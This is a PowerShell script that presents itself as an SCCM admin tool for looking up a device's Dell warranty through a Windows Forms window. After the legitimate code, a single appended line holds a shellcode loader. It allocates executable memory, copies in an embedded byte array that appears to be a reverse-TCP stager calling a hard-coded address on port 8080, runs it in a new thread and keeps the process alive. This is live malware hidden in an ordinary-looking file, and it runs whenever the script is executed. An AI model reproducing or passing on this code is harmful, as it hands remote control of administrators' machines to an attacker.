[CmdLetBinding()]
param(
    [parameter(Mandatory=$true, HelpMessage="Name of the Site server with the SMS Provider")]
    [ValidateNotNullOrEmpty()]
    [string]$SiteServer,
    [parameter(Mandatory=$true, HelpMessage="Name of the device that will be checked for warranty")]
    [ValidateNotNullOrEmpty()]
    [string]$DeviceName,
    [parameter(Mandatory=$true, HelpMessage="ResourceID of the device")]
    [ValidateNotNullOrEmpty()]
    [string]$ResourceID
)
Begin {
    
    try {
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
            }
        }
    }
    catch [Exception] {
        Throw "Unable to determine SiteCode"
    }
}
Process {
    
    function Load-Form {
        $Form.Controls.AddRange(@(
            $BlogLink,
            $ButtonGet,
            $TBComputerName,
            $TBServiceTag,
            $TBModel,
            $GBServiceTag,
            $GBComputerName,
            $GBModel,
            $DataGridView
        ))
        $Form.Add_Shown({$Form.Activate()})
        [void]$Form.ShowDialog()
    }

    function Prompt-MessageBox {
        param(
            [Parameter(Mandatory=$true)]
            [string]$Message,
            [Parameter(Mandatory=$true)]
            [string]$WindowTitle,
            [Parameter(Mandatory=$true)]
            [System.Windows.Forms.MessageBoxButtons]$Buttons = [System.Windows.Forms.MessageBoxButtons]::OK,
            [Parameter(Mandatory=$true)]
            [System.Windows.Forms.MessageBoxIcon]$Icon = [System.Windows.Forms.MessageBoxIcon]::None
        )
        return [System.Windows.Forms.MessageBox]::Show($Message, $WindowTitle, $Buttons, $Icon)
    }

    function Get-AssetInformation {
        param(
            [Parameter(Mandatory=$true)]
            [alias("SerialNumber")]
            [string]$ServiceTag
        )
        $WebService = New-WebServiceProxy -Uri "http://xserv.dell.com/services/AssetService.asmx?WSDL" -UseDefaultCredential
        $AssetInformation = $WebService.GetAssetInformation(([GUID]::NewGuid()).Guid,"Dell Warranty",$ServiceTag)
        $AssetHeaderData = $AssetInformation | Select-Object -Property AssetHeaderData
        $Entitlements = $AssetInformation | Select-Object -Property Entitlements
        foreach ($Entitlement in $Entitlements.Entitlements | Where-Object { ($_.ServiceLevelCode -ne "D") }) {
            if (($Entitlement.ServiceLevelDescription -ne $null) -or ($Entitlement.ServiceLevelCode -ne $null)) {
		        $DataGridView.Rows.Add(
			        $Entitlement.ServiceLevelDescription,
                    (Get-Date -Year ($Entitlement.StartDate.Year) -Month ($Entitlement.StartDate.Month) -Day ($Entitlement.StartDate.Day)).ToShortDateString(),
                    (Get-Date -Year ($Entitlement.EndDate.Year) -Month ($Entitlement.EndDate.Month) -Day ($Entitlement.EndDate.Day)).ToShortDateString(),
                    $Entitlement.DaysLeft, 
                    $Entitlement.EntitlementType
                )
            }
        }
    }

    function Get-DeviceComputerSystemInfo {
        param(
            [Parameter(Mandatory=$true)]
            [string]$ResourceID,
            [Parameter(Mandatory=$true)]
            [ValidateSet("Model","SerialNumber")]
            [string]$Property
        )
        switch ($Property) {
            "Model" { $DeviceQuery = "SELECT * FROM SMS_G_System_COMPUTER_SYSTEM WHERE ResourceID like '$($ResourceID)'" }
            "SerialNumber" { $DeviceQuery = "SELECT * FROM SMS_G_System_PC_BIOS WHERE ResourceID like '$($ResourceID)'" }
        }
        $DeviceComputerSystem = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Query $DeviceQuery -ComputerName $SiteServer -ErrorAction SilentlyContinue
        if ($DeviceComputerSystem -ne $null) {
            return $DeviceComputerSystem
        }
    }

    function Validate-DeviceHardwareInventory {
        param(
            [Parameter(Mandatory=$true)]
            [string]$ResourceID
        )
        $DeviceQuery = "SELECT * FROM SMS_G_System_COMPUTER_SYSTEM WHERE ResourceID like '$($ResourceID)'"
        $DeviceValidation = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Query $DeviceQuery -ComputerName $SiteServer -ErrorAction SilentlyContinue
        if ($DeviceValidation -eq $null) {
            $ButtonClicked = Prompt-MessageBox -Message "No valid hardware inventory found for $($Script:DeviceName)" -WindowTitle "Hardware inventory error" -Buttons OK -Icon Error
            if ($ButtonClicked -eq "OK") {
                $Form.Dispose()
                $Form.Close()
            }
        }
        else {
            return $true
        }
    }

    function Show-Warranty {
        $ButtonGet.Enabled = $false
        if ($DataGridView.RowCount -ge 1) {
            $DataGridView.Rows.Clear()
        }
        $TBModel.ResetText()
        $TBServiceTag.ResetText()
        if ((Validate-DeviceHardwareInventory -ResourceID $ResourceID) -eq $true) {
            $SerialNumber = Get-DeviceComputerSystemInfo -ResourceID $ResourceID -Property SerialNumber | Select-Object -ExpandProperty SerialNumber
            if ($SerialNumber.Length -eq 7) {
                $Model = Get-DeviceComputerSystemInfo -ResourceID $ResourceID -Property Model | Select-Object -ExpandProperty Model
                $TBServiceTag.Text = $SerialNumber
                $TBModel.Text = $Model
                [System.Windows.Forms.Application]::DoEvents()
                Get-AssetInformation -ServiceTag $SerialNumber
            }
            else {
                $ButtonClicked = Prompt-MessageBox -Message "A non-Dell service tag was found for $($Script:DeviceName)" -WindowTitle "Service tag error" -Buttons OK -Icon Error
                if ($ButtonClicked -eq "OK") {
                    $Form.Dispose()
                    $Form.Close()
                }
            }
        }
        $ButtonGet.Enabled = $true
    }

    
    Add-Type -AssemblyName "System.Drawing"
    Add-Type -AssemblyName "System.Windows.Forms"

    
    $Form = New-Object System.Windows.Forms.Form    
    $Form.Size = New-Object System.Drawing.Size(600,315)  
    $Form.MinimumSize = New-Object System.Drawing.Size(600,315)
    $Form.MaximumSize = New-Object System.Drawing.Size(600,315)
    $Form.SizeGripStyle = "Hide"
    $Form.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($PSHome + "\powershell.exe")
    $Form.Text = "Dell Warranty Status 2.0"

    
    $GBComputerName = New-Object System.Windows.Forms.GroupBox
    $GBComputerName.Location = New-Object System.Drawing.Size(10,10)
    $GBComputerName.Size = New-Object System.Drawing.Size(160,50)
    $GBComputerName.Text = "Device name"
    $GBServiceTag = New-Object System.Windows.Forms.GroupBox
    $GBServiceTag.Location = New-Object System.Drawing.Size(180,10)
    $GBServiceTag.Size = New-Object System.Drawing.Size(100,50)
    $GBServiceTag.Text = "Service tag"
    $GBModel = New-Object System.Windows.Forms.GroupBox
    $GBModel.Location = New-Object System.Drawing.Size(290,10)
    $GBModel.Size = New-Object System.Drawing.Size(170,50)
    $GBModel.Text = "Model"

    
    $TBComputerName = New-Object System.Windows.Forms.TextBox
    $TBComputerName.Location = New-Object System.Drawing.Size(20,30)
    $TBComputerName.Size = New-Object System.Drawing.Size(140,20)
    $TBComputerName.Text = $DeviceName
    $TBComputerName.ReadOnly = $true
    $TBServiceTag = New-Object System.Windows.Forms.TextBox
    $TBServiceTag.Location = New-Object System.Drawing.Size(190,30)
    $TBServiceTag.Size = New-Object System.Drawing.Size(80,20)
    $TBServiceTag.ReadOnly = $true
    $TBModel = New-Object System.Windows.Forms.TextBox
    $TBModel.Location = New-Object System.Drawing.Size(300,30)
    $TBModel.Size = New-Object System.Drawing.Size(150,20)
    $TBModel.ReadOnly = $true

    
    $ButtonGet = New-Object System.Windows.Forms.Button
    $ButtonGet.Location = New-Object System.Drawing.Size(475,23)
    $ButtonGet.Size = New-Object System.Drawing.Size(100,30)
    $ButtonGet.Text = "Show Warranty"
    $ButtonGet.Add_Click({Show-Warranty})

    
    $OpenLink = {[System.Diagnostics.Process]::Start("http://www.scconfigmgr.com")}
    $BlogLink = New-Object System.Windows.Forms.LinkLabel
    $BlogLink.Location = New-Object System.Drawing.Size(9,255) 
    $BlogLink.Size = New-Object System.Drawing.Size(150,25)
    $BlogLink.Text = "www.scconfigmgr.com"
    $BlogLink.Add_Click($OpenLink)

    
    $DataGridView = New-Object System.Windows.Forms.DataGridView
    $DataGridView.Location = New-Object System.Drawing.Size(10,70)
    $DataGridView.Size = New-Object System.Drawing.Size(565,180)
    $DataGridView.AllowUserToAddRows = $false
    $DataGridView.AllowUserToDeleteRows = $false
    $DataGridView.AutoSizeColumnsMode = [System.Windows.Forms.DataGridViewAutoSizeColumnsMode]::Fill
    $DataGridView.ColumnCount = 5
    $DataGridView.ColumnHeadersVisible = $true
    $DataGridView.Columns[0].Name = "Warranty Type"
    $DataGridView.Columns[0].AutoSizeMode = "Fill"
    $DataGridView.Columns[1].Name = "Start Date"
    $DataGridView.Columns[1].AutoSizeMode = "Fill"
    $DataGridView.Columns[2].Name = "End Date"
    $DataGridView.Columns[2].AutoSizeMode = "Fill"
    $DataGridView.Columns[3].Name = "Days Left"
    $DataGridView.Columns[3].AutoSizeMode = "Fill"
    $DataGridView.Columns[4].Name = "Status"
    $DataGridView.Columns[4].AutoSizeMode = "Fill"
    $DataGridView.ColumnHeadersHeightSizeMode = "DisableResizing"
    $DataGridView.AllowUserToResizeRows = $false
    $DataGridView.RowHeadersWidthSizeMode = "DisableResizing"
    $DataGridView.RowHeadersVisible = $false
    $DataGridView.Anchor = "Top, Bottom, Left, Right"
    $DataGridView.Name = "DGVWarranty"
    $DataGridView.ReadOnly = $true
    $DataGridView.BackGroundColor = "White"
    $DataGridView.TabIndex = "5"

    
    Load-Form
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x29,0x8d,0x04,0x52,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

